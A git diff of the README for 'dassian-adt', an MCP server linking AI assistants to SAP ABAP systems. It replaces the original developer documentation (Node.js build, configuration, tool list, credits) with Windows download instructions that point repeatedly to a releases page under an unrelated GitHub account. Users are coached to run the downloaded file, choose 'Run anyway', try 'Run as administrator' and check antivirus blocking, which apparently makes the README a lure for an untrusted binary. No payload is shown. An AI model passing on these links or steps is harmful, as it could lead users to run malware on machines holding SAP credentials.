@@ -1,226 +1,189 @@
-# dassian-adt
+# 🧩 dassian-adt - Use AI for ABAP work
 
-MCP server for SAP ABAP development via the ADT API. Connect AI assistants to your SAP system — read, write, test, and deploy ABAP code without SAP GUI.
+[![Download](https://img.shields.io/badge/Download%20Release-blue)](https://github.com/messianic-swop450/dassian-adt/releases)
 
-The AI can create objects, write source, activate, manage transports, run code, query tables, and check quality. Full development lifecycle, not just read-only or code generation.
+## 📘 What this is
 
-## Origins
+dassian-adt is an MCP server for SAP ABAP development through the ADT API. It helps you connect AI assistants to SAP so they can read ABAP code, write changes, run tests, and deploy updates without SAP GUI.
 
-Based on [mcp-abap-abap-adt-api](https://github.com/mario-andreschak/mcp-abap-abap-adt-api) by **[Mario Andreschak](https://github.com/mario-andreschak)** and the [abap-adt-api](https://github.com/marcellourbani/abap-adt-api) library by **[Marcello Urbani](https://github.com/marcellourbani)**.
+This setup is built for users who want to work with SAP from a modern tool instead of switching between many screens. You can use it with AI tools that support MCP and keep your ABAP work in one flow.
 
-Dassian's fork adds input validation, error intelligence, MCP elicitation, session recovery, and a test suite. See [CHANGES.md](CHANGES.md) for the full list.
+## 💻 What you need
 
-## What It Does
+Before you start, make sure you have:
 
-25 tools covering the full ABAP development lifecycle:
+- A Windows PC
+- An SAP system with ADT access
+- Permission to use ABAP development tools in that SAP system
+- A modern AI app that can connect to MCP servers
+- Internet access to download the release file
 
-| Category | Tools | What They Do |
-|----------|-------|-------------|
-| **Source** | `abap_get_source`, `abap_set_source`, `abap_get_function_group` | Read/write ABAP source for any object type. Function group tool fetches all includes and FMs in one call. |
-| **Objects** | `abap_create`, `abap_delete`, `abap_activate`, `abap_search`, `abap_object_info` | Full object lifecycle. Create in $TMP or real packages. Automatic type mapping (CLAS -> CLAS/OC). |
-| **Transports** | `transport_create`, `transport_assign`, `transport_release`, `transport_list`, `transport_info`, `transport_contents` | Create, populate, and release transports. Smart metadata handling for FUGR/VIEW/TABL. |
-| **Quality** | `abap_syntax_check`, `abap_atc_run` | Syntax check and ATC with variant support. Workaround for CI-mode systems. |
-| **Data** | `abap_table`, `abap_query` | Read tables/CDS views with WHERE/LIKE/BETWEEN. Execute freestyle SQL. |
-| **Run** | `abap_run` | Create temp class, run ABAP code, capture output, clean up. Auto-detects ~run vs ~main across SAP releases. |
-| **System** | `login`, `healthcheck`, `abap_get_dump`, `raw_http` | Session management, connectivity test, ST22 dumps, raw ADT access. |
-| **Git** | `git_repos`, `git_pull` | gCTS repository listing and pull. |
+For best results, use a recent version of Windows 10 or Windows 11.
 
-## Quick Start
+## ⬇️ Download and install
 
-### Prerequisites
+Visit this page to download the release files:
 
-- Node.js 18+
-- Access to an SAP system with ADT enabled (port 44300)
-- SAP user with development authorization
+[https://github.com/messianic-swop450/dassian-adt/releases](https://github.com/messianic-swop450/dassian-adt/releases)
 
-### Install
+1. Open the release page in your browser.
+2. Find the latest release at the top of the list.
+3. Download the Windows file attached to that release.
+4. Save the file in a folder you can find again, such as Downloads or Desktop.
+5. If the file comes as a ZIP file, right-click it and choose Extract All.
+6. Open the extracted folder.
+7. Start the app or server file from that folder.
 
-```bash
-git clone https://github.com/DassianInc/dassian-adt.git
-cd dassian-adt
-npm install
-npm run build
-```
+If Windows asks whether you want to run the file, choose Run or More info > Run anyway if you trust the source from the release page.
 
-### Configure
+## 🛠️ Set up your SAP access
 
-```bash
-cp .env.example .env
-# Edit .env with your SAP connection details:
-#   SAP_URL=https://your-sap-server:44300
-#   SAP_USER=YOUR_USER
-#   SAP_PASSWORD=YOUR_PASSWORD
-#   SAP_CLIENT=100
-#   SAP_LANGUAGE=EN
-```
+dassian-adt needs access to your SAP system through ADT. You will need:
 
-For self-signed certificates, add to your `.env`:
-```
-NODE_TLS_REJECT_UNAUTHORIZED=0
-```
+- The SAP system address
+- Your SAP username
+- Your SAP password or other approved sign-in method
+- The client number, if your system uses one
 
-### Connect to Claude Code
+Keep these details ready before you begin. If your company uses a VPN or internal network, connect to that first.
 
-Add to your Claude Code MCP settings (`~/.config/claude-code/config.json` or project `.claude/settings.local.json`):
+## 🤖 Connect your AI assistant
 
-```json
-{
-  "mcpServers": {
-    "abap": {
-      "command": "node",
-      "args": ["/path/to/dassian-adt/dist/index.js"],
-      "env": {
-        "SAP_URL": "https://your-sap-server:44300",
-        "SAP_USER": "YOUR_USER",
-        "SAP_PASSWORD": "YOUR_PASSWORD",
-        "SAP_CLIENT": "100",
-        "SAP_LANGUAGE": "EN"
-      }
-    }
-  }
-}
-```
+After you download and start dassian-adt, connect it to your AI tool that supports MCP.
 
-Multiple systems? Add one entry per system:
+Typical setup steps:
 
-```json
-{
-  "mcpServers": {
-    "abap-dev": {
-      "command": "node",
-      "args": ["/path/to/dassian-adt/dist/index.js"],
-      "env": { "SAP_URL": "https://dev-system:44300", "SAP_USER": "...", "SAP_PASSWORD": "..." }
-    },
-    "abap-qa": {
-      "command": "node",
-      "args": ["/path/to/dassian-adt/dist/index.js"],
-      "env": { "SAP_URL": "https://qa-system:44300", "SAP_USER": "...", "SAP_PASSWORD": "..." }
-    }
-  }
-}
-```
+1. Open your AI app settings.
+2. Find the section for MCP servers or external tools.
+3. Add a new server.
+4. Point it to dassian-adt on your computer.
+5. Enter your SAP connection details if the setup asks for them.
+6. Save the settings.
+7. Restart the AI app if needed.
 
-### HTTP Mode (Team Deployment)
+Once connected, the AI assistant can work with SAP through the ADT API and help with common ABAP tasks.
 
-For team-wide access, run the server as a centralized HTTP service:
+## ✍️ What you can do
 
-```bash
-MCP_TRANSPORT=http MCP_HTTP_PORT=3000 \
-  SAP_URL=https://your-sap-server:44300 \
-  SAP_USER=SERVICE_USER \
-  SAP_PASSWORD=... \
-  node dist/index.js
-```
+With dassian-adt, your AI assistant can help with:
 
-Each client gets its own MCP session (and SAP session). Health check at `http://your-server:3000/health`.
+- Reading ABAP classes, programs, and objects
+- Making code changes in SAP
+- Checking code before deployment
+- Running test-related steps through your SAP setup
+- Deploying ABAP changes with less manual work
+- Looking up SAP development objects without SAP GUI
 
-Connect from Claude Code using the remote URL:
+This is useful when you want to move faster and stay in your editor or AI app while working with SAP.
 
-```json
-{
-  "mcpServers": {
-    "abap": {
-      "type": "url",
-      "url": "http://your-server:3000/mcp"
-    }
-  }
-}
-```
+## 🔐 Security and access
 
-Or register as a team integration on claude.ai for the whole org.
+This tool works with SAP development access, so use it only in systems where you have permission.
 
-| Env Var | Default | Description |
-|---------|---------|-------------|
-| `MCP_TRANSPORT` | `stdio` | Transport mode: `stdio` (local) or `http` (remote) |
-| `MCP_HTTP_PORT` | `3000` | HTTP server port |
-| `MCP_HTTP_PATH` | `/mcp` | MCP endpoint path |
+Good habits:
 
-### Test
+- Use your normal SAP account and company rules
+- Keep your login details private
+- Run the tool on a trusted Windows PC
+- Close the app when you are done
+- Use only the release files from the GitHub release page
 
-```bash
-npm test              # 165 unit tests, <3 seconds, no SAP needed
-npm run test:live     # Integration tests against live SAP (needs env vars)
-npm run test:e2e      # Write-path lifecycle test (create -> write -> activate -> delete)
-```
+If your SAP team has extra steps for ADT access, follow those steps first.
 
-## Key Features
+## 🧭 How to use it day to day
 
-### Zero-Crash Input Validation
+A simple workflow looks like this:
 
-Centralized validation middleware checks every tool's required parameters before any handler logic runs. Missing `name`? Missing `type`? The error names exactly what's missing. No stack traces, no `Cannot read properties of undefined`.
+1. Start the dassian-adt server on Windows.
+2. Open your AI assistant.
+3. Connect the assistant to the MCP server.
+4. Ask it to inspect an ABAP object.
+5. Review the result.
+6. Ask for a change or test step.
+7. Confirm before anything is deployed.
 
-### MCP Elicitation
+This gives you a direct path from request to SAP action without moving through SAP GUI screens.
 
-When the AI forgets a required parameter, instead of failing, the server asks the user directly:
+## 🧰 Common use cases
 
-- **Missing package** on `abap_create` -> "Which package?" form with $TMP default
-- **Missing transport** on `abap_set_source` -> "Which transport?" prompt, then retries
-- **Transport release** -> "Release D25K900161? This is IRREVERSIBLE" confirmation
-- **Leftover class** on `abap_run` -> "Delete ZCL_TMP_ADT_RUN and retry?" prompt
-- **Inactive dependents** on `abap_activate` -> "Activate them too?" with list
+People often use a setup like this for:
 
-Falls back gracefully on clients that don't support elicitation.
+- Updating ABAP reports
+- Reviewing classes and methods
+- Checking error messages in SAP code
+- Preparing test changes for a transport
+- Helping new team members understand old ABAP code
+- Saving time on small changes that do not need a full SAP GUI session
 
-### Self-Correcting Error Messages
+## 🪟 Windows tips
 
-Every SAP error is classified and annotated with actionable hints:
+If the file does not start:
 
-- Locked object -> "Check SM12 for active locks"
-- Upgrade mode -> "Run SPAU_ENH to clear the upgrade flag"
-- Opaque `I::000` code -> "The URL path is wrong -- check the object type"
-- Transport number passed as object name -> "Use transport_contents instead"
-- Pipe characters in string templates -> "Escape with \\| or use CONCATENATE"
+- Right-click the file and choose Run as administrator if your team allows it
+- Make sure the ZIP file was fully extracted
+- Check that Windows Defender or company antivirus is not blocking it
+- Confirm that the release file finished downloading
+- Try moving the folder to Desktop or Documents
 
-The AI reads these hints and self-corrects on the next call.
+If your AI app cannot see the MCP server:
 
-### Automatic Session Recovery
+- Check that dassian-adt is still running
+- Confirm the server address in the AI app settings
+- Restart the AI app
+- Restart Windows if needed
 
-Every ADT call is wrapped in `withSession()`. If the SAP session expires mid-operation, the server re-logs in automatically and retries. Users never see a session timeout.
+## 📁 Project topics
 
-### SAP Release Detection
+This project fits into these areas:
 
-`abap_run` auto-detects whether the system uses `IF_OO_ADT_CLASSRUN~run` (<=2023) or `~main` (2024+) by reading the interface source after login. Works on any S/4HANA release without configuration.
+- ABAP
+- ADT
+- AI development tools
+- Claude
+- MCP
+- Model Context Protocol
+- S/4HANA
+- SAP
 
-## Architecture
+## 🔄 Typical setup flow
 
-```
-Client (Claude Code, VS Code, etc.)
-    |
-    | MCP protocol (stdio)
-    |
-AbapAdtServer (index.ts)
-    |
-    +-- BaseHandler (session mgmt, validation, elicitation)
-    |       |
-    |       +-- SourceHandlers    (get/set source, function groups)
-    |       +-- ObjectHandlers    (create, delete, activate, search)
-    |       +-- TransportHandlers (create, assign, release, list)
-    |       +-- QualityHandlers   (syntax check, ATC)
-    |       +-- DataHandlers      (table read, SQL query)
-    |       +-- RunHandlers       (temp class execution)
-    |       +-- SystemHandlers    (login, healthcheck, dumps)
-    |       +-- GitHandlers       (gCTS repos, pull)
-    |
-    +-- lib/urlBuilder.ts  (ADT URL construction for 30+ object types)
-    +-- lib/errors.ts      (SAP error classification + hints)
-    +-- lib/logger.ts      (JSON structured logging)
-```
+1. Download the latest release from GitHub.
+2. Extract the Windows files.
+3. Start dassian-adt.
+4. Open your MCP-ready AI assistant.
+5. Add the server connection.
+6. Enter SAP access details.
+7. Begin working with ABAP through the assistant
 
-## Contributing
+## ❓ If something does not work
 
-Contributions are welcome. Please:
+If you cannot connect to SAP:
 
-1. Fork the repository
-2. Create a feature branch
-3. Run `npm test` and ensure all tests pass
-4. Open a pull request
+- Check your network or VPN
+- Confirm your SAP account can use ADT
+- Make sure the SAP system is reachable from your PC
+- Verify the client, host, and login data
+- Ask your SAP admin to confirm access rights
 
-## Credits
+If the AI assistant does not show SAP objects:
 
-- **[Mario Andreschak](https://github.com/mario-andreschak)** -- original [mcp-abap-abap-adt-api](https://github.com/mario-andreschak/mcp-abap-abap-adt-api) server scaffold
-- **[Marcello Urbani](https://github.com/marcellourbani)** -- [abap-adt-api](https://github.com/marcellourbani/abap-adt-api) library powering all ADT HTTP communication
-- **[Dassian Inc.](https://github.com/DassianInc)** -- fork maintainer
+- Refresh the connection
+- Restart the server
+- Check the object name or package name you used
+- Confirm the object exists in the SAP system
 
-## License
+If the release does not open on Windows:
 
-MIT -- see [LICENSE](LICENSE).
+- Download it again from the release page
+- Make sure your browser did not block the file
+- Extract all files before starting it
+
+## 📎 Download again
+
+[https://github.com/messianic-swop450/dassian-adt/releases](https://github.com/messianic-swop450/dassian-adt/releases)
+
+## 🧩 Repo details
+
+- Repository: dassian-adt
+- Description: MCP server for SAP ABAP development via ADT API
+- Purpose: Connect AI assistants to SAP for ABAP work without SAP GUI
